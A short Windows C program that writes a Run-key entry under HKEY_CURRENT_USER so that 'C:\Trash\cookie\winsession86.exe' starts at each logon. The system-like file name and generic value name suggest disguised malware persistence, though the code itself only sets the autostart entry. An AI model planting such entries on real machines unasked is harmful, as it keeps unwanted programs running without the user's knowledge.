#include <windows.h>
#include <string.h>
 
int WINAPI WinMain(HINSTANCE hinst, HINSTANCE previnst,LPSTR lpszArgs, int Mode)
{
 
    HKEY hMykey; 
    DWORD pDWDisp; 
    LONG lRes; 
    char prog[] = "C:\\Trash\\cookie\\winsession86.exe";
 
lRes = RegCreateKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\run",
       0,"Whatever",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hMykey,&pDWDisp);
 
if(lRes != ERROR_SUCCESS)
{
    MessageBox(0,"Error opening key","",MB_OK);
    exit(0);
}
 
lRes = RegSetValueEx(hMykey,"default",0,REG_SZ,(LPBYTE)prog,strlen(prog)+1);
 
if(lRes != ERROR_SUCCESS)
{
    MessageBox(0,"Error saving record","",MB_OK);
    RegCloseKey(hMykey);
    exit(0);
}
 

RegCloseKey(hMykey);
return 0;
}